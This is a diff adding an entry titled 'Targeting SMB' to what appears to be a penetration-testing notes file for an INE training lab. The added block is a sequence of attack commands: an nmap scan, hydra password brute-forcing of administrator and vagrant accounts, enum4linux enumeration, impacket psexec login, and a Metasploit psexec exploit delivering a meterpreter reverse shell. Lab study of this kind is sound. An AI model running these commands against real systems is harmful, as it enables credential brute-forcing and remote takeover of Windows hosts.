@@ -1686,9 +1686,27 @@ ssh vagrant@10.0.26.161
 whoami
 ssh Administrator@10.0.26.161
 ```
+87) Targeting SMB
 
-
-
+```
+cat /etc/hosts
+ping demo.ine.local
+nmap -sV -sC -p 445 10.0.31.252 
+hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
+hydra -l vagrant -P /usr/share/wordlists/metasploit/unix_passwords.txt 10.0.31.252 smb
+enum4linux -u vagrant -p vagrant -U 10.0.31.252
+cp /usr/share/doc/python3-impacket/examples/psexec.py /root/Desktop
+cp /usr/share/doc/python3-impacket/examples/psexec.py . # for current dir
+chmod +x psexec.py
+python3 psexec.py Administrator@10.0.31.252
+msfconsole
+use exploit/windows/smb/psexec
+set RHOSTS 10.0.31.252
+set SMBUser Administrator
+Set SMBPass vagrant
+set payload windows/x64/meterpreter/reverse_tcp
+exploit
+```
 
 
 
